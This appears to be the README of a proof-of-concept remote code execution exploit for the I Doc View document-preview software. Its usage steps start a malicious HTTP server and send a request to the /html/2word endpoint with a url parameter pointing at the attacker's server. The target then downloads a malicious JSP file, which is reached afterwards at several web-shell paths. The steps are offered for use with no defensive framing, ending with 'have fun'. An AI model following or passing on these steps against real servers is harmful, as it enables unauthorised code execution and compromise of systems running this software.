# I Doc View RCE PoC

# Usage

1. python3 idocviewrce.py start evil http server

2. GET /html/2word?url=http://youvpsip:6666 receive http request download evil jsp file

3. GET /triple_kill.jsp or GET /data/urlhtml/md5(url)/first_blood.jsp or GET /data/urlhtml/md5(url)/double_kill.jsp 

4. have fun